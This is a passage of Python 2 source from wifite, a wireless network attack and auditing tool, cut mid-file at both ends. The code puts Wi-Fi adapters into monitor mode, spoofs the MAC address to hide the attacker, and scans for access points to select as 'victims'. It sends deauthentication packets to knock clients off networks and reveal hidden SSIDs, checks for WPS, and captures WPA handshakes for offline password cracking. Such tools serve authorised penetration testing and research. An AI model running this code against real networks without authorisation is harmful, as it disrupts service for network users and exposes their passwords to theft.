				print "  %s. %s" % (self.G+str(i+1)+self.W, self.G+monitor+self.W)
			ri = raw_input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
				  (self.GR,     self.W,       self.G,       self.W,                              self.G, len(monitors), self.W, self.G))
			while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
				ri = raw_input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
					 (self.GR,   self.W,                                              self.G, len(monitors), self.W, self.G))
			i = int(ri)
			return monitors[i - 1]

		proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=self.DN)
		for line in proc.communicate()[0].split('\n'):
			if len(line) == 0 or line.startswith('Interface'): continue
			#monitors.append(line[:line.find('\t')])
			monitors.append(line)

		if len(monitors) == 0:
			print self.R+' [!]'+self.O+" no wireless interfaces were found."+self.W
			print self.R+' [!]'+self.O+" you need to plug in a wifi device or install drivers.\n"+self.W
			self.exit_gracefully(0)
		elif self.WIRELESS_IFACE != '' and monitors.count(self.WIRELESS_IFACE) > 0:
			self.mac_anonymize(monitor)
			return self.enable_monitor_mode(monitor)

		elif len(monitors) == 1:
			monitor = monitors[0][:monitors[0].find('\t')]
			self.mac_anonymize(monitor)

			return self.enable_monitor_mode(monitor)

		print self.GR+" [+]"+self.W+" available wireless devices:"
		for i, monitor in enumerate(monitors):
			print "  %s%d%s. %s" % (self.G, i + 1, self.W, monitor)

		ri = raw_input(self.GR+" [+]"+self.W+" select number of device to put into monitor mode (%s1-%d%s): " % (self.G, len(monitors), self.W))
		while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
			ri = raw_input(" [+] select number of device to put into monitor mode (%s1-%d%s): " % (self.G, len(monitors), self.W))
		i = int(ri)
		monitor = monitors[i-1][:monitors[i-1].find('\t')]
		self.mac_anonymize(monitor)

		return self.enable_monitor_mode(monitor)

	######################
	# SCANNING FUNCTIONS #
	######################
	def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
		"""
		Scans for access points. Asks user to select target(s).
			"channel" - the channel to scan on, 0 scans all channels.
			"iface"   - the interface to scan on. must be a real interface.
			"tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
		Returns list of selected targets and list of clients.
		"""

		self.remove_airodump_files(self.temp + 'wifite')

		command = ['airodump-ng',
			   '-a', # only show associated clients
			   '-w', self.temp + 'wifite'] # output file
		if channel != 0:
			command.append('-c')
			command.append(str(channel))
		command.append(iface)

		proc = Popen(command, stdout=self.DN, stderr=self.DN)

		time_started = time.time()
		print self.GR+' [+] '+self.G+'initializing scan'+self.W+' ('+self.G+iface+self.W+'), updates at 5 sec intervals, '+self.G+'CTRL+C'+self.W+' when ready.'
		(targets, clients) = ([], [])
		try:
			deauth_sent = 0.0
			old_targets = []
			stop_scanning = False
			while True:
				time.sleep(0.3)
				if not os.path.exists(self.temp + 'wifite-01.csv') and time.time() - time_started > 1.0:
					print self.R+'\n [!] ERROR!'+self.W
					# RTL8187 Unknown Error 132 FIX
					if proc.poll() != None: # Check if process has finished
						proc = Popen(['airodump-ng', iface], stdout=self.DN, stderr=PIPE)
						if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
							if self.rtl8187_fix(iface):
								return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
					print self.R+' [!]'+self.O+' wifite is unable to generate airodump-ng output files'+self.W
					print self.R+' [!]'+self.O+' you may want to disconnect/reconnect your wifi device'+self.W
					self.exit_gracefully(1)

				(targets, clients) = self.parse_csv(self.temp + 'wifite-01.csv')

				# If we are targeting a specific ESSID/BSSID, skip the scan once we find it.
				if self.TARGET_ESSID != '':
					for t in targets:
						if t.ssid.lower() == self.TARGET_ESSID.lower():
							self.send_interrupt(proc)
							try: os.kill(proc.pid, SIGTERM)
							except OSError: pass
							except UnboundLocalError: pass
							targets = [t]
							stop_scanning = True
							break
				if self.TARGET_BSSID != '':
					for t in targets:
						if t.bssid.lower() == self.TARGET_BSSID.lower():
							self.send_interrupt(proc)
							try: os.kill(proc.pid, SIGTERM)
							except OSError: pass
							except UnboundLocalError: pass
							targets = [t]
							stop_scanning = True
							break

				# If user has chosen to target all access points, wait 20 seconds, then return all
				if self.ATTACK_ALL_TARGETS and time.time() - time_started > 10:
					print self.GR+'\n [+]'+self.W+' auto-targeted %s%d%s access point%s' % \
						  (self.G, len(targets), self.W, '' if len(targets) == 1 else 's')
					stop_scanning = True

				if self.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
					# Remove targets with power < threshold
					i = 0
					before_count = len(targets)
					while i < len(targets):
						if targets[i].power < self.ATTACK_MIN_POWER:
							targets.pop(i)
						else: i += 1
					print self.GR+'\n [+]'+self.W+' removed %s targets with power < %ddB, %s remain' % \
						(self.G+str(before_count - len(targets))+self.W, self.ATTACK_MIN_POWER, self.G+str(len(targets))+self.W)
					stop_scanning = True

				if stop_scanning: break

				# If there are unknown SSIDs, send deauths to them.
				if channel != 0 and time.time() - deauth_sent > 5:
					deauth_sent = time.time()
					for t in targets:
						if t.ssid == '':
							print "\r %s deauthing hidden access point (%s)               \r" % \
								(self.GR+self.sec_to_hms(time.time() - time_started)+self.W, self.G+t.bssid+self.W),
							stdout.flush()
							# Time to deauth
							cmd = ['aireplay-ng',
							   '--deauth', '1',
							   '-a', t.bssid]
							for c in clients:
								if c.station == t.bssid:
									cmd.append('-c')
									cmd.append(c.bssid)
									break
							cmd.append(iface)
							proc_aireplay = Popen(cmd, stdout=self.DN, stderr=self.DN)
							proc_aireplay.wait()
							time.sleep(0.5)
						else:
							for ot in old_targets:
								if ot.ssid == '' and ot.bssid == t.bssid:
									print '\r %s successfully decloaked "%s"                     ' % \
										(self.GR+self.sec_to_hms(time.time() - time_started)+self.W, self.G+t.ssid+self.W)

					old_targets = targets[:]
				if self.VERBOSE_APS and len(targets) > 0:
					targets = sorted(targets, key=lambda t: t.power, reverse=True)
					if not self.WPS_DISABLE:
						self.wps_check_targets(targets, self.temp + 'wifite-01.cap', verbose=False)

					os.system('clear')
					print self.GR+'\n [+] '+self.G+'scanning'+self.W+' ('+self.G+iface+self.W+'), updates at 5 sec intervals, '+self.G+'CTRL+C'+self.W+' when ready.\n'
					print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % ('BSSID              ' if self.SHOW_MAC_IN_SCAN else '')
					print '   --- --------------------  %s--  ----  -----  ----  ------' % ('-----------------  ' if self.SHOW_MAC_IN_SCAN else '')
					for i, target in enumerate(targets):
						print "   %s%2d%s " % (self.G, i + 1, self.W),
						# SSID
						if target.ssid == '':
							p = self.O+'('+target.bssid+')'+self.GR+' '+self.W
							print '%s' % p.ljust(20),
						elif ( target.ssid.count('\x00') == len(target.ssid) ):
							p = '<Length '+str(len(target.ssid))+'>'
							print '%s' % self.C+p.ljust(20)+self.W,
						elif len(target.ssid) <= 20:
							print "%s" % self.C+target.ssid.ljust(20)+self.W,
						else:
							print "%s" % self.C+target.ssid[0:17] + '...'+self.W,
						# BSSID
						if self.SHOW_MAC_IN_SCAN:
							print self.O,target.bssid+self.W,
						# Channel
						print self.G+target.channel.rjust(3),self.W,
						# Encryption
						if target.encryption.find("WEP") != -1: print self.G,
						else:                                   print self.O,
						print "\b%3s" % target.encryption.strip().ljust(4) + self.W,
						# Power
						if target.power >= 55:   col = self.G
						elif target.power >= 40: col = self.O
						else:                    col = self.R
						print "%s%3ddb%s" % (col,target.power, self.W),
						# WPS
						if self.WPS_DISABLE:
							print "  %3s" % (self.O+'n/a'+self.W),
						else:
							print "  %3s" % (self.G+'wps'+self.W if target.wps else self.R+' no'+self.W),
						# Clients
						client_text = ''
						for c in clients:
							if c.station == target.bssid:
								if client_text == '': client_text = 'client'
								elif client_text[-1] != "s": client_text += "s"
						if client_text != '': print '  %s' % (self.G+client_text+self.W)
						else: print ''
					print ''
				print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
					self.GR+self.sec_to_hms(time.time() - time_started)+self.W, self.G+'scanning'+self.W,
					self.G+str(len(targets))+self.W, '' if len(targets) == 1 else 's',
					self.G+str(len(clients))+self.W, '' if len(clients) == 1 else 's'),

				stdout.flush()
		except KeyboardInterrupt:
			pass
		print ''

		self.send_interrupt(proc)
		try: os.kill(proc.pid, SIGTERM)
		except OSError: pass
		except UnboundLocalError: pass

		# Use "wash" program to check for WPS compatibility
		if not self.WPS_DISABLE:
			self.wps_check_targets(targets, self.temp + 'wifite-01.cap')

		self.remove_airodump_files(self.temp + 'wifite')

		if stop_scanning: return (targets, clients)
		print ''

		if len(targets) == 0:
			print self.R+' [!]'+self.O+' no targets found!'+self.W
			print self.R+' [!]'+self.O+' you may need to wait for targets to show up.'+self.W
			print ''
			self.exit_gracefully(1)

		if self.VERBOSE_APS: os.system('clear')

		# Sort by Power
		targets = sorted(targets, key=lambda t: t.power, reverse=True)

		victims = []
		print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % ('BSSID              ' if self.SHOW_MAC_IN_SCAN else '')
		print '   --- --------------------  %s--  ----  -----  ----  ------' % ('-----------------  ' if self.SHOW_MAC_IN_SCAN else '')
		for i, target in enumerate(targets):
			print "   %s%2d%s " % (self.G, i + 1, self.W),
			# SSID
			if target.ssid == '':
				p = self.O+'('+target.bssid+')'+self.GR+' '+self.W
				print '%s' % p.ljust(20),
			elif ( target.ssid.count('\x00') == len(target.ssid) ):
				p = '<Length '+str(len(target.ssid))+'>'
				print '%s' % self.C+p.ljust(20)+self.W,
			elif len(target.ssid) <= 20:
				print "%s" % self.C+target.ssid.ljust(20)+self.W,
			else:
				print "%s" % self.C+target.ssid[0:17] + '...'+self.W,
			# BSSID
			# he BSSID is the MAC address of the wireless access point (WAP) generated by combining the 24 bit
			# Organization Unique Identifier (the manufacturer's identity) and the manufacturer's assigned
			# 24-bit identifier for the radio chipset in the WAP.
			if self.SHOW_MAC_IN_SCAN:
				print self.O,target.bssid+self.W,
			# Channel
			print self.G+target.channel.rjust(3),self.W,
			# Encryption
			if target.encryption.find("WEP") != -1: print self.G,
			else:                                   print self.O,
			print "\b%3s" % target.encryption.strip().ljust(4) + self.W,
			# Power
			if target.power >= 55:   col = self.G
			elif target.power >= 40: col = self.O
			else:                    col = self.R
			print "%s%3ddb%s" % (col,target.power, self.W),
			# WPS
			if self.WPS_DISABLE:
				print "  %3s" % (self.O+'n/a'+self.W),
			else:
				print "  %3s" % (self.G+'wps'+self.W if target.wps else self.R+' no'+self.W),
			# Clients
			client_text = ''
			for c in clients:
				if c.station == target.bssid:
					if client_text == '': client_text = 'client'
					elif client_text[-1] != "s": client_text += "s"
			if client_text != '': print '  %s' % (self.G+client_text+self.W)
			else: print ''

		ri = raw_input(self.GR+"\n [+]"+self.W+" select "+self.G+"target numbers"+self.W+" ("+self.G+"1-%s)" %
						(str(len(targets))+self.W) + "separated by commas, or '%s': " % (self.G+'all'+self.W))
		if ri.strip().lower() == 'all':
			victims = targets[:]
		else:
			for r in ri.split(','):
				r = r.strip()
				if r.find('-') != -1:
					(sx, sy) = r.split('-')
					if sx.isdigit() and sy.isdigit():
						x = int(sx)
						y = int(sy) + 1
						for v in xrange(x, y):
							victims.append(targets[v - 1])
				elif not r.isdigit() and r.strip() != '':
					print self.O+" [!]"+self.R+" not a number: %s " % (self.O+r+self.W)
				elif r != '':
					victims.append(targets[int(r) - 1])

		if len(victims) == 0:
			print self.O+'\n [!] '+self.R+'no targets selected.\n'+self.W
			self.exit_gracefully(0)

		print ''
		print ' [+] %s%d%s target%s selected.' % (self.G, len(victims), self.W, '' if len(victims) == 1 else 's')

		return (victims, clients)

	def parse_csv(self, filename):
		"""
		Parses given lines from airodump-ng CSV file.
		Returns tuple: List of targets and list of clients.
		"""

		if not os.path.exists(filename): return ([], [])
		try:
			f = open(filename, 'r')
			lines = f.read().split('\n')
			f.close()
		except IOError: return ([], [])

		hit_clients = False
		targets = []
		clients = []
		for line in lines:
			if line.startswith('Station MAC,'): hit_clients = True
			if line.startswith('BSSID') or line.startswith('Station MAC') or line.strip() == '': continue
			if not hit_clients: # Access points
				c = line.split(', ', 13)
				if len(c) <= 11: continue
				cur = 11
				c[cur] = c[cur].strip()
				if not c[cur].isdigit(): cur += 1
				if cur > len(c) - 1: continue

				ssid = c[cur+1]
				ssidlen = int(c[cur])
				ssid = ssid[:ssidlen]

				power = int(c[cur-4])
				if power < 0: power += 100

				enc = c[5]
				# Ignore non-WPA/WEP networks.
				if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue
				if self.WEP_DISABLE and enc.find('WEP') != -1: continue
				if self.WPA_DISABLE and self.WPS_DISABLE and enc.find('WPA') != -1: continue
				enc = enc.strip()[:4]

				t = Target(c[0], power, c[cur-2].strip(), c[3], enc, ssid)
				targets.append(t)
			else: # Connected clients
				c = line.split(', ')
				if len(c) < 6: continue
				bssid   = re.sub(r'[^a-zA-Z0-9:]', '', c[0])
				station = re.sub(r'[^a-zA-Z0-9:]', '', c[5])
				power   = c[3]
				if station != 'notassociated':
					c = Client(bssid, station, power)
					clients.append(c)
		return (targets, clients)

	def wps_check_targets(self, targets, cap_file, verbose=True):
		"""
		Uses reaver's "walsh" (or wash) program to check access points in cap_file
		for WPS functionality. Sets "wps" field of targets that match to True.
		"""

		if not self.program_exists('walsh') and not self.program_exists('wash'):
			self.WPS_DISABLE = True # Tell 'scan' we were unable to execute walsh
			return
		program_name = 'walsh' if self.program_exists('walsh') else 'wash'

		if len(targets) == 0 or not os.path.exists(cap_file): return
		if verbose:
			print self.GR+' [+]'+self.W+' checking for '+self.G+'WPS compatibility'+self.W+'...',
			stdout.flush()

		cmd = [program_name,
		   '-f', cap_file,
		   '-C'] # ignore Frame Check Sum errors
		proc_walsh = Popen(cmd, stdout=PIPE, stderr=self.DN)
		proc_walsh.wait()
		for line in proc_walsh.communicate()[0].split('\n'):
			if line.strip() == '' or line.startswith('Scanning for'): continue
			bssid = line.split(' ')[0]

			for t in targets:
				if t.bssid.lower() == bssid.lower():
					t.wps = True
		if verbose:
			print 'done'
		removed = 0
		if not self.WPS_DISABLE and self.WPA_DISABLE:
			i = 0
			while i < len(targets):
				if not targets[i].wps and targets[i].encryption.find('WPA') != -1:
					removed += 1
					targets.pop(i)
				else: i += 1
			if removed > 0 and verbose: print self.GR+' [+]'+self.O+' removed %d non-WPS-enabled targets%s' % \
											  (removed, self.W)

	def rtl8187_fix(self, iface):
		"""
		Attempts to solve "Unknown error 132" common with RTL8187 devices.
		Puts down interface, unloads/reloads driver module, then puts iface back up.
		Returns True if fix was attempted, False otherwise.
		"""

		# Check if current interface is using the RTL8187 chipset
		proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=self.DN)
		proc_airmon.wait()
		using_rtl8187 = False
		for line in proc_airmon.communicate()[0].split():
			line = line.upper()
			if line.strip() == '' or line.startswith('INTERFACE'): continue
			if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True

		if not using_rtl8187:
			# Display error message and exit
			print self.R+' [!]'+self.O+' unable to generate airodump-ng CSV file'+self.W
			print self.R+' [!]'+self.O+' you may want to disconnect/reconnect your wifi device'+self.W
			self.exit_gracefully(1)

		print self.O+" [!]"+self.W+" attempting "+self.O+"RTL8187 'Unknown Error 132'"+self.W+" fix..."

		original_iface = iface
		# Take device out of monitor mode
		airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=self.DN)
		airmon.wait()
		for line in airmon.communicate()[0].split('\n'):
			if line.strip() == '' or \
				line.startswith("Interface") or \
				line.find('(removed)') != -1:
				continue
			original_iface = line.split()[0] # line[:line.find('\t')]

		# Remove drive modules, block/unblock ifaces, probe new modules.
		self.print_and_exec(['ifconfig', original_iface, 'down'])
		self.print_and_exec(['rmmod', 'rtl8187'])
		self.print_and_exec(['rfkill', 'block', 'all'])
		self.print_and_exec(['rfkill', 'unblock', 'all'])
		self.print_and_exec(['modprobe', 'rtl8187'])
		self.print_and_exec(['ifconfig', original_iface, 'up'])
		self.print_and_exec(['airmon-ng', 'start', original_iface])

		print '\r                                                        \r',
		print self.O+' [!] '+self.W+'restarting scan...\n'

		return True

	def print_and_exec(self, cmd):
		"""
		Prints and executes command "cmd". Also waits half a second
		Used by rtl8187_fix (for prettiness)
		"""

		print '\r                                                        \r',
		stdout.flush()
		print self.O+' [!] '+self.W+'executing: '+self.O+' '.join(cmd) + self.W,
		stdout.flush()
		call(cmd, stdout=self.DN, stderr=self.DN)
		time.sleep(0.1)

	####################
	# HELPER FUNCTIONS #
	####################

	def remove_airodump_files(self, prefix):
		"""
		Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
		Used by wpa_get_handshake() and attack_wep()
		Remove .cap's from previous attack sessions
		i = 2
		while os.path.exists(self.temp + 'wep-' + str(i) + '.cap'):
			os.remove(self.temp + 'wep-' + str(i) + '.cap')
			i += 1
		"""

		self.remove_file(prefix + '-01.cap')
		self.remove_file(prefix + '-01.csv')
		self.remove_file(prefix + '-01.kismet.csv')
		self.remove_file(prefix + '-01.kismet.netxml')
		for filename in os.listdir(self.temp):
			if filename.lower().endswith('.xor'): self.remove_file(self.temp + filename)
		for filename in os.listdir('.'):
			if filename.startswith('replay_') and filename.endswith('.cap'):
				self.remove_file(filename)
			if filename.endswith('.xor'): self.remove_file(filename)

	def remove_file(self, filename):
		"""
		Attempts to remove a file. Does not throw error if file is not found.
		"""
		try: os.remove(filename)
		except OSError: pass

	def program_exists(self, program):
		"""
		Uses 'which' (linux command) to check if a program is installed.
		"""

		proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
		txt = proc.communicate()
		if txt[0].strip() == '' and txt[1].strip() == '':
			return False
		if txt[0].strip() != '' and txt[1].strip() == '':
			return True

		return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)

	def sec_to_hms(self, sec):
		"""
		Converts integer sec to h:mm:ss format
		"""

		if sec <= -1: return '[endless]'
		h = sec / 3600
		sec %= 3600
		m  = sec / 60
		sec %= 60
		return '[%d:%02d:%02d]' % (h, m, sec)


	def send_interrupt(self, process):
		"""
		Sends interrupt signal to process's PID.
		"""

		try:
			os.kill(process.pid, SIGINT)
			# os.kill(process.pid, SIGTERM)
		except OSError: pass           # process cannot be killed
		except TypeError: pass         # pid is incorrect type
		except UnboundLocalError: pass # 'process' is not defined
		except AttributeError: pass    # Trying to kill "None"

	def get_mac_address(self, iface):
		"""
		Returns MAC address of "iface".
		"""

		proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=self.DN)
		proc.wait()
		mac = ''
		first_line = proc.communicate()[0].split('\n')[0]
		for word in first_line.split(' '):
			if word != '': mac = word
		if mac.find('-') != -1: mac = mac.replace('-', ':')
		if len(mac) > 17: mac = mac[0:17]
		return mac

	def generate_random_mac(self, old_mac):
		"""
		Generates a random MAC address.
		Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
		Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
		"""

		random.seed()
		new_mac = old_mac[:8].lower().replace('-', ':')
		for i in xrange(0, 6):
			if i % 2 == 0: new_mac += ':'
			new_mac += '0123456789abcdef'[random.randint(0,15)]

		# Prevent generating the same MAC address via recursion.
		if new_mac == old_mac:
			new_mac = self.generate_random_mac(old_mac)
		return new_mac

	def mac_anonymize(self, iface):
		"""
		Changes MAC address of 'iface' to a random MAC.
		Only randomizes the last 6 digits of the MAC, so the vender says the same.
		Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
		"""

		if self.DO_NOT_CHANGE_MAC: return
		if not self.program_exists('ifconfig'): return

		# Store old (current) MAC address
		proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=self.DN)
		proc.wait()
		for word in proc.communicate()[0].split('\n')[0].split(' '):
			if word != '': old_mac = word
		self.ORIGINAL_IFACE_MAC = (iface, old_mac)

		new_mac = self.generate_random_mac(old_mac)

		call(['ifconfig', iface, 'down'])

		print self.GR+" [+]"+self.W+" changing %s's MAC from %s to %s..." % (self.G+iface+self.W, self.G+old_mac+self.W, self.O+new_mac+self.W),
		stdout.flush()

		proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=self.DN)
		proc.wait()
		call(['ifconfig', iface, 'up'], stdout=self.DN, stderr=self.DN)
		print 'done'


	def mac_change_back(self):
		"""
		Changes MAC address back to what it was before attacks began.
		"""

		iface = self.ORIGINAL_IFACE_MAC[0]
		old_mac = self.ORIGINAL_IFACE_MAC[1]
		if iface == '' or old_mac == '': return

		print self.GR+" [+]"+self.W+" changing %s's mac back to %s..." % (self.G+iface+self.W, self.G+old_mac+self.W),
		stdout.flush()

		call(['ifconfig', iface, 'down'], stdout=self.DN, stderr=self.DN)
		proc = Popen(['ifconfig', iface, 'hw', 'ether', old_mac], stdout=PIPE, stderr=self.DN)
		proc.wait()
		call(['ifconfig', iface, 'up'], stdout=self.DN, stderr=self.DN)
		print "done"

	def analyze_capfile(self, capfile):
		"""
		Analyzes given capfile for handshakes using various programs.
		Prints results to console.
		"""

		if self.TARGET_ESSID == '' and self.TARGET_BSSID == '':
			print self.R+' [!]'+self.O+' target ssid and bssid are required to check for handshakes'
			print self.R+' [!]'+self.O+' please enter essid (access point name) using -e <name>'
			print self.R+' [!]'+self.O+' and/or target bssid (mac address) using -b <mac>\n'
			# self.exit_gracefully(1)

		if self.TARGET_BSSID == '':
			# Get the first BSSID found in tshark!
			self.TARGET_BSSID = self.get_bssid_from_cap(self.TARGET_ESSID, capfile)
			# if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
			if self.TARGET_BSSID == '':
				print self.R+' [!]'+self.O+' unable to guess BSSID from ESSID!'
			else:
				print self.GR+' [+]'+self.W+' guessed bssid: %s' % (self.G+self.TARGET_BSSID+self.W)

		if self.TARGET_BSSID != '' and self.TARGET_ESSID == '':
			self.TARGET_ESSID = self.get_essid_from_cap(self.TARGET_BSSID, capfile)

		print self.GR+'\n [+]'+self.W+' checking for handshakes in %s' % (self.G+capfile+self.W)

		t = Target(self.TARGET_BSSID, '', '', '', 'WPA', self.TARGET_ESSID)

		if self.program_exists('pyrit'):
			result = self.has_handshake_pyrit(t, capfile)
			print self.GR+' [+]'+self.W+'    '+self.G+'pyrit'+self.W+':\t\t\t %s' % \
				  (self.G+'found!'+self.W if result else self.O+'not found'+self.W)
		else: print self.R+' [!]'+self.O+' program not found: pyrit'
		if self.program_exists('cowpatty'):
			result = self.has_handshake_cowpatty(t, capfile, nonstrict=True)
			print self.GR+' [+]'+self.W+'    '+self.G+'cowpatty'+self.W+' (nonstrict):\t %s' %\
				  (self.G+'found!'+self.W if result else self.O+'not found'+self.W)
			result = self.has_handshake_cowpatty(t, capfile, nonstrict=False)
			print self.GR+' [+]'+self.W+'    '+self.G+'cowpatty'+self.W+' (strict):\t %s' % \
				  (self.G+'found!'+self.W if result else self.O+'not found'+self.W)
		else: print self.R+' [!]'+self.O+' program not found: cowpatty'
		if self.program_exists('tshark'):
			result = self.has_handshake_tshark(t, capfile)
			print self.GR+' [+]'+self.W+'    '+self.G+'tshark'+self.W+':\t\t\t %s' % \
				  (self.G+'found!'+self.W if result else self.O+'not found'+self.W)
		else: print self.R+' [!]'+self.O+' program not found: tshark'
		if self.program_exists('aircrack-ng'):
			result = self.has_handshake_aircrack(t, capfile)
			print self.GR+' [+]'+self.W+'    '+self.G+'aircrack-ng'+self.W+':\t\t %s' % \
				  (self.G+'found!'+self.W if result else self.O+'not found'+self.W)
		else: print self.R+' [!]'+self.O+' program not found: aircrack-ng'

		print ''

		self.exit_gracefully(0)

	def get_essid_from_cap(self, bssid, capfile):
		"""
		Attempts to get ESSID from cap file using BSSID as reference.
		Returns '' if not found.
		"""

		if not self.program_exists('tshark'): return ''

		cmd = ['tshark',
		   '-r', capfile,
		   '-R', 'wlan.fc.type_subtype == 0x05 && wlan.sa == %s' % bssid,
		   '-n']
		proc = Popen(cmd, stdout=PIPE, stderr=self.DN)
		proc.wait()
		for line in proc.communicate()[0].split('\n'):
			if line.find('SSID=') != -1:
				essid = line[line.find('SSID=')+5:]
				print self.GR+' [+]'+self.W+' guessed essid: %s' % (self.G+essid+self.W)
				return essid
		print self.R+' [!]'+self.O+' unable to guess essid!'+self.W
		return ''

	def get_bssid_from_cap(self, essid, capfile):
		"""
		Returns first BSSID of access point found in cap file.
		This is not accurate at all, but it's a good guess.
		Returns '' if not found.
		"""

		if not self.program_exists('tshark'): return ''

		# Attempt to get BSSID based on ESSID
		if essid != '':
			cmd = ['tshark',
			   '-r', capfile,
			   '-R', 'wlan_mgt.ssid == "%s" && wlan.fc.type_subtype == 0x05' % (essid),
			   '-n',            # Do not resolve MAC vendor names
			   '-T', 'fields',  # Only display certain fields
			   '-e', 'wlan.sa'] # souce MAC address
			proc = Popen(cmd, stdout=PIPE, stderr=self.DN)
			proc.wait()
			bssid = proc.communicate()[0].split('\n')[0]
			if bssid != '': return bssid

		cmd = ['tshark',
		   '-r', capfile,
		   '-R', 'eapol',
		   '-n']
		proc = Popen(cmd, stdout=PIPE, stderr=self.DN)
		proc.wait()
		for line in proc.communicate()[0].split('\n'):
			if line.endswith('Key (msg 1/4)') or line.endswith('Key (msg 3/4)'):
				while line.startswith(' ') or line.startswith('\t'): line = line[1:]
				line = line.replace('\t', ' ')
				while line.find('  ') != -1: line = line.replace('  ', ' ')
				return line.split(' ')[2]
			elif line.endswith('Key (msg 2/4)') or line.endswith('Key (msg 4/4)'):
				while line.startswith(' ') or line.startswith('\t'): line = line[1:]
				line = line.replace('\t', ' ')
				while line.find('  ') != -1: line = line.replace('  ', ' ')
				return line.split(' ')[4]
		return ''

	def exit_gracefully(self, code=0):
		"""
		We may exit the program at any time.
		We want to remove the self.temp folder and any files contained within it.
		Removes the self.temp files/folder and exists with error code "code".
		"""
		# Remove self.temp files and folder

		if os.path.exists(self.temp):
			for file in os.listdir(self.temp):
				os.remove(self.temp + file)
			os.rmdir(self.temp)
		# Disable monitor mode if enabled by us
		self.disable_monitor_mode()
		# Change MAC address back if spoofed
		self.mac_change_back()
		print self.GR+" [+]"+self.W+" quitting" # wifite will now exit"
		print ''
		# GTFO
		exit(code)

	def attack_interrupted_prompt(self):
		"""
		Promps user to decide if they want to exit,
		skip to cracking WPA handshakes,
		or continue attacking the remaining targets (if applicable).
		returns True if user chose to exit complete, False otherwise
		"""

		should_we_exit = False
		# If there are more targets to attack, ask what to do next
		if self.TARGETS_REMAINING > 0:
			options = ''
			print self.GR+"\n [+] %s%d%s target%s remain%s" % (self.G, self.TARGETS_REMAINING, self.W,
								'' if self.TARGETS_REMAINING == 1 else 's',
								's' if self.TARGETS_REMAINING == 1 else '')
			print self.GR+" [+]"+self.W+" what do you want to do?"
			options += self.G+'c'+self.W
			print self.G+"     [c]ontinue"+self.W+" attacking targets"

			if len(self.WPA_CAPS_TO_CRACK) > 0:
				options += self.W+', '+self.O+'s'+self.W
				print self.O+"     [s]kip"+self.W+" to cracking WPA cap files"
			options += self.W+', or '+self.R+'e'+self.W
			print self.R+"     [e]xit"+self.W+" completely"
			ri = ''
			while ri != 'c' and ri != 's' and ri != 'e':
				ri = raw_input(self.GR+' [+]'+self.W+' please make a selection (%s): ' % options)

			if ri == 's':
				self.TARGETS_REMAINING = -1 # Tells start() to ignore other targets, skip to cracking
			elif ri == 'e':
				should_we_exit = True
		return should_we_exit

	#################
	# WPA FUNCTIONS #
	#################

	def wpa_get_handshake(self, iface, target, clients):
		"""
		Opens an airodump capture on the target, dumping to a file.
		During the capture, sends deauthentication packets to the target both as
		general deauthentication packets and specific packets aimed at connected clients.
		Waits until a handshake is captured.
			"iface"   - interface to capture on
			"target"  - Target object containing info on access point
			"clients" - List of Client objects associated with the target
		Returns True if handshake was found, False otherwise
		"""

		if self.WPA_ATTACK_TIMEOUT <= 0: self.WPA_ATTACK_TIMEOUT = -1

		# Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
		save_as = self.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
			  + '_' + target.bssid.replace(':', '-') + '.cap'

		# Check if we already have a handshake for this SSID... If we do, generate a new filename
		save_index = 0
		while os.path.exists(save_as):
			save_index += 1
			save_as = self.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
						 + '_' + target.bssid.replace(':', '-') \
						 + '_' + str(save_index) + '.cap'

		# Remove previous airodump output files (if needed)
		self.remove_airodump_files(self.temp + 'wpa')

		# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
		try:
			# Start airodump-ng process to capture handshakes
			cmd = ['airodump-ng',
			  '-w', self.temp + 'wpa',
			  '-c', target.channel,
			  '--bssid', target.bssid, iface]
			proc_read = Popen(cmd, stdout=self.DN, stderr=self.DN)

			# Setting deauthentication process here to avoid errors later on
			proc_deauth = None

			print ' %s starting %swpa handshake capture%s on "%s"' % \
				(self.GR+self.sec_to_hms(self.WPA_ATTACK_TIMEOUT)+self.W, self.G, self.W, self.G+target.ssid+self.W)
			got_handshake = False

			seconds_running = 0

			target_clients = clients[:]
			client_index = -1

			# Deauth and check-for-handshake loop
			while not got_handshake and (self.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < self.WPA_ATTACK_TIMEOUT):

				time.sleep(1)
				seconds_running += 1

				print "                                                          \r",
				print ' %s listening for handshake...\r' % \
				  (self.GR+self.sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running)+self.W),
				stdout.flush()

				if seconds_running % self.WPA_DEAUTH_TIMEOUT == 0:
					# Send deauth packets via aireplay-ng
					cmd = ['aireplay-ng',
					  '-0',  # Attack method (Deauthentication)
					   '1',  # Number of packets to send
					  '-a', target.bssid]

					client_index += 1

